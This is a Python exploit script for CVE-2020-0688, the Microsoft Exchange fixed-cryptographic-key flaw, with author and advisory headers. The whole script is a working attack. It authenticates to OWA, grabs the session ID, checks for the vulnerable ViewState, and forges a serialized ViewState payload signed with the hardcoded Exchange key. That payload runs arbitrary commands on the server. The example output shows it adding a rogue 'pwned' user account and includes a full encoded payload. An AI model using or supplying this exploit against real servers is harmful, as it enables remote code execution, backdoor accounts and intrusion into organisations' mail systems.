# Exploit Author: Photubias
# Vendor Advisory: [1] https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688
#                  [2] https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
# Vendor Homepage: https://www.microsoft.com
# Version: MS Exchange Server 2010 SP3 up to 2019 CU4
# Tested on: MS Exchange 2019 v15.2.221.12 running on Windows Server 2019
# CVE: CVE-2020-0688

#! /usr/bin/env python
# -*- coding: utf-8 -*- 
&#039;&#039;&#039; 

    
	Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name CVE-2020-0688-Photubias.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 2.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        Reverse Engineered Serialization code from https://github.com/pwntester/ysoserial.net

        Example Output:
        CVE-2020-0688-Photubias.py -t https://10.11.12.13 -u sean -c "net user pwned pwned /add"
        [+] Login worked
        [+] Got ASP.NET Session ID: 83af2893-6e1c-4cee-88f8-b706ebc77570
        [+] Detected OWA version number 15.2.221.12
        [+] Vulnerable View State "B97B4E27" detected, this host is vulnerable!
        [+] All looks OK, ready to send exploit (net user pwned pwned /add)? [Y/n]:
        [+] Got Payload: /wEy0QYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADzBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIm5ldCB1c2VyIHB3bmVkIHB3bmVkIC9hZGQiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5PgvjXlpQBwdP741icUH6Wivr7TlI6g==
              Sending now ...
&#039;&#039;&#039;
import urllib2, urllib, base64, binascii, hashlib, hmac, struct, argparse, sys, cookielib, ssl, getpass

## STATIC STRINGS
# This string acts as a template for the serialization (contains "###payload###" to be replaced and TWO size locations)
strSerTemplate = base64.b64decode(&#039;/wEy2gYAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAD8BDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIiMjI3BheWxvYWQjIyMiIDwvU3lzdGVtOlN0cmluZz4NCiAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pgs=&#039;)
# This is a key installed in the Exchange Server, it is changeable, but often not (part of the vulnerability)
strSerKey = binascii.unhexlify(&#039;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#039;)

def convertInt(iInput, length): 
    return struct.pack("<I" , int(iInput)).encode(&#039;hex&#039;)[:length]

def getYsoserialPayload(sCommand, sSessionId):
    ## PART1 of the payload to hash
    strPart1 = strSerTemplate.replace(&#039;###payload###&#039;, sCommand)
    ## Fix the length fields
    #print(binascii.hexlify(strPart1[3]+strPart1[4])) ## &#039;da06&#039; > &#039;06da&#039; (0x06b8 + len(sCommand))
    #print(binascii.hexlify(strPart1[224]+strPart1[225])) ## &#039;fc04&#039; > &#039;04fc&#039; (0x04da + len(sCommand))
    strLength1 = convertInt(0x06b8 + len(sCommand),4)
    strLength2 = convertInt(0x04da + len(sCommand),4)
    strPart1 = strPart1[:3] + binascii.unhexlify(strLength1) + strPart1[5:]
    strPart1 = strPart1[:224] + binascii.unhexlify(strLength2) + strPart1[226:]
    
    ## PART2 of the payload to hash
    strPart2 = &#039;274e7bb9&#039;
    for v in sSessionId: strPart2 += binascii.hexlify(v)+&#039;00&#039;
    strPart2 = binascii.unhexlify(strPart2)
    
    strMac = hmac.new(strSerKey, strPart1 + strPart2, hashlib.sha1).hexdigest()
    strResult = base64.b64encode(strPart1 + binascii.unhexlify(strMac))
    return strResult

def verifyLogin(sTarget, sUsername, sPassword, oOpener, oCookjar):
    if not sTarget[-1:] == &#039;/&#039;: sTarget += &#039;/&#039;
    ## Verify Login
    lPostData = {&#039;destination&#039; : sTarget, &#039;flags&#039; : &#039;4&#039;, &#039;forcedownlevel&#039; : &#039;0&#039;, &#039;username&#039; : sUsername, &#039;password&#039; : sPassword, &#039;passwordText&#039; : &#039;&#039;, &#039;isUtf8&#039; : &#039;1&#039;}
    try: sResult = oOpener.open(urllib2.Request(sTarget + &#039;owa/auth.owa&#039;, data=urllib.urlencode(lPostData), headers={&#039;User-Agent&#039;:&#039;Python&#039;})).read()
    except: print(&#039;[!] Error, &#039; + sTarget + &#039; not reachable&#039;)
    bLoggedIn = False
    for cookie in oCookjar:
        if cookie.name == &#039;cadata&#039;: bLoggedIn = True
    if not bLoggedIn:
        print(&#039;[-] Login Wrong, too bad&#039;)
        exit(1)
    print(&#039;[+] Login worked&#039;)

    ## Verify Session ID
    sSessionId = &#039;&#039;
    sResult = oOpener.open(urllib2.Request(sTarget+&#039;ecp/default.aspx&#039;, headers={&#039;User-Agent&#039;:&#039;Python&#039;})).read()
    for cookie in oCookjar:
        if &#039;SessionId&#039; in cookie.name: sSessionId = cookie.value
    print(&#039;[+] Got ASP.NET Session ID: &#039; + sSessionId)

    ## Verify OWA Version
    sVersion = &#039;&#039;
    try: sVersion = sResult.split(&#039;stylesheet&#039;)[0].split(&#039;href="&#039;)[1].split(&#039;/&#039;)[2]
    except: sVersion = &#039;favicon&#039;
    if &#039;favicon&#039; in sVersion:
        print(&#039;[*] Problem, this user has never logged in before (wizard detected)&#039;)
        print(&#039;       Please log in manually first at &#039; + sTarget + &#039;ecp/default.aspx&#039;)
        exit(1)
    print(&#039;[+] Detected OWA version number &#039;+sVersion)

    ## Verify ViewStateValue
    sViewState = &#039;&#039;
    try: sViewState = sResult.split(&#039;__VIEWSTATEGENERATOR&#039;)[2].split(&#039;value="&#039;)[1].split(&#039;"&#039;)[0]
    except: pass
    if sViewState == &#039;B97B4E27&#039;:
        print(&#039;[+] Vulnerable View State "B97B4E27" detected, this host is vulnerable!&#039;)
    else:
        print(&#039;[-] Error, viewstate wrong or not correctly parsed: &#039;+sViewState)
        ans = raw_input(&#039;[?] Still want to try the exploit? [y/N]: &#039;)
        if ans == &#039;&#039; or ans.lower() == &#039;n&#039;: exit(1)
    return sSessionId, sTarget, sViewState
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(&#039;-t&#039;, &#039;--target&#039;, help=&#039;Target IP or hostname (e.g. https://owa.contoso.com)&#039;, default=&#039;&#039;)
    parser.add_argument(&#039;-u&#039;, &#039;--username&#039;, help=&#039;Username (e.g. joe or joe@contoso.com)&#039;, default=&#039;&#039;)
    parser.add_argument(&#039;-p&#039;, &#039;--password&#039;, help=&#039;Password (leave empty to ask for it)&#039;, default=&#039;&#039;)
    parser.add_argument(&#039;-c&#039;, &#039;--command&#039;, help=&#039;Command to put behind "cmd /c " (e.g. net user pwned pwned /add)&#039;, default=&#039;&#039;)
    args = parser.parse_args()
    if args.target == &#039;&#039; or args.username == &#039;&#039; or args.command == &#039;&#039;:
        print(&#039;[!] Example usage: &#039;)
        print(&#039; &#039; + sys.argv[0] + &#039; -t https://owa.contoso.com -u joe -c "net user pwned pwned /add"&#039;)
    else:
        if args.password == &#039;&#039;: sPassword = getpass.getpass(&#039;[*] Please enter the password: &#039;)
        else: sPassword = args.password
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        oCookjar = cookielib.CookieJar()
        #oProxy = urllib2.ProxyHandler({&#039;http&#039;: &#039;127.0.0.1:8080&#039;, &#039;https&#039;: &#039;127.0.0.1:8080&#039;})
        #oOpener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),urllib2.HTTPCookieProcessor(oCookjar),oProxy)
        oOpener = urllib2.build_opener(urllib2.HTTPSHandler(context=ctx),urllib2.HTTPCookieProcessor(oCookjar))
        sSessionId, sTarget, sViewState = verifyLogin(args.target, args.username, sPassword, oOpener, oCookjar)
        ans = raw_input(&#039;[+] All looks OK, ready to send exploit (&#039; + args.command + &#039;)? [Y/n]: &#039;)
        if ans.lower() == &#039;n&#039;: exit(0)
        sPayLoad = getYsoserialPayload(args.command, sSessionId)
        print(&#039;[+] Got Payload: &#039; + sPayLoad)
        sURL = sTarget + &#039;ecp/default.aspx?__VIEWSTATEGENERATOR=&#039; + sViewState + &#039;&__VIEWSTATE=&#039; + urllib.quote_plus(sPayLoad)
        print(&#039;      Sending now ...&#039;)
        try: oOpener.open(urllib2.Request(sURL, headers={&#039;User-Agent&#039;:&#039;Python&#039;}))
        except urllib2.HTTPError, e:
            if e.code == &#039;500&#039;: print(&#039;[+] This probably worked (Error Code 500 received)&#039;)

if __name__ == "__main__":
	main()

